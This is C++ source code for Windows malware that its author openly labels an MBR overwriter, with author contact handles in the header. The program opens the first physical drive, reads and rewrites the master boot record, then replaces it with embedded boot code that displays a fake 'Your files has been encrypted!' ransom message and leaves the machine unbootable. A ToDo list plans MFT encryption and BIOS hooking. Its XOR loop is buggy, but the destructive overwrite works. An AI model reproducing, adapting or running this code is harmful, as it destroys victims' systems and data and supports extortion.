/* ------------------------------------------------------ */
/* >>>>>>>>>>>>>>>>> Coded by DarxiS <<<<<<<<<<<<<<<<<<<  */
/* ------------------------------------------------------ */
/* ABOUT PROJECT: */
/* ----------------
* > Version: 5.0
* > Creation date: 26.01.2020
* > Last update: 15.03.2020
* > OS: Windows 2000, Windows XP, Windows Vista, Windows 7, Windows 8, Windows 10
* > Malware type: MBR-overwriter
* > ToDo: Add MFT encoding, add VBR-overwriter, add hooking 13h BIOS interrupt to release NTLDR API modification
---------------- */
/* CONTACT ME: */
/* -------------
* Email: darxis.exception@vfemail.net
* Telegram: @Darxis
* Jabber: Darxis@exploit.im
* HackTheBox: https://www.hackthebox.eu/profile/37928
------------- */
/* ------------------------------------------------------ */




/* ---------------------------------- SYSTEM LIB ---------------------------------- */
#include <stdio.h>
#include "stdafx.h"
#include <iostream>
#include <Windows.h>
/* -------------------------------------------------------------------------------- */




/* --------------------- USING NAMESPACE AND MBR SIZE ----------------------------- */
#define MBR_BUFF_SIZE 0x200
using namespace std;
/* -------------------------------------------------------------------------------- */




/* ------------------------------ PAYLOAD SHELLCODE ------------------------------- */
unsigned char getMarkedBytes[MBR_BUFF_SIZE] =
{
	0x89, 0xC8, 0xFA, 0x8E, 0xD0, 0x8E, 0xC0, 0x8E, 0xD8, 0xFB, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB4,
	0x13, 0x30, 0xC0, 0xBB, 0x0A, 0x00, 0x31, 0xD2, 0xB9, 0x1E, 0x00, 0xE8, 0x1E, 0x00, 0x59, 0x6F,
	0x75, 0x72, 0x20, 0x66, 0x69, 0x6C, 0x65, 0x73, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65,
	0x6E, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x65, 0x64, 0x21, 0x5D, 0xCD, 0x10, 0xEB,
	0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
/* -------------------------------------------------------------------------------- */




/* ---------------------------------- MAIN FUNCTION ------------------------------- */
int _tmain(int argc, _TCHAR* argv[])
{
	/* ------- OBJECTS AND INTEGERS ------- */
	DWORD getSimpleRd;
	BOOL getStatusOk;
	BYTE *pBuff;
	LPVOID getMbr = VirtualAlloc(NULL, MBR_BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);
	LPVOID getMbrBuffer = VirtualAlloc(NULL, MBR_BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);
	HANDLE getNewFile = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	/* ------------------------------------ */



	try
	{
		/* ---------- SIMPLE INTEGER ---------- */
		BYTE *p = (BYTE *)getMbr;
		pBuff = (BYTE *)getMbrBuffer;
		/* ------------------------------------ */




		/* ------------ FIRST STEP ------------ */
		if (getNewFile == INVALID_HANDLE_VALUE)
		{
			return -1;
		}
		getStatusOk = ReadFile(getNewFile, getMbr, MBR_BUFF_SIZE, &getSimpleRd, NULL);


		if (!getStatusOk)
		{
			return -2;
		}


		if (*p == 0x90)
		{
			CloseHandle(getNewFile);
			goto getFinally;
		}
		CloseHandle(getNewFile);
		/* ------------------------------------ */




		/* ------------ SECOND STEP ----------- */
		for (int counter = 0; counter < MBR_BUFF_SIZE; counter++)
		{
			*pBuff = *p ^ 0x90;
		}
		getNewFile = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		if (getNewFile == INVALID_HANDLE_VALUE)
		{
			return -3;
		}
		getStatusOk = WriteFile(getNewFile, getMbrBuffer, MBR_BUFF_SIZE, &getSimpleRd, NULL);

		if (!getStatusOk)
		{
			return -4;
		}
		/* ------------------------------------ */




		/* ------------ THIRD STEP ------------ */
		memcpy(getMbr, getMarkedBytes, 0x1bd);

		SetFilePointer(getNewFile, 0, NULL, FILE_BEGIN);
		WriteFile(getNewFile, getMbr, MBR_BUFF_SIZE, &getSimpleRd, NULL);

		CloseHandle(getNewFile);
		/* ------------------------------------ */




		/* ----------  SIMPLE FUNCTION -------- */
	getFinally:
		VirtualFree(getMbr, MBR_BUFF_SIZE, MEM_RELEASE);
		VirtualFree(getMbrBuffer, MBR_BUFF_SIZE, MEM_RELEASE);
		return 0;
		/* ------------------------------------ */
	}
	catch (...)
	{
		return -5;
	}
}
/* -------------------------------------------------------------------------------- */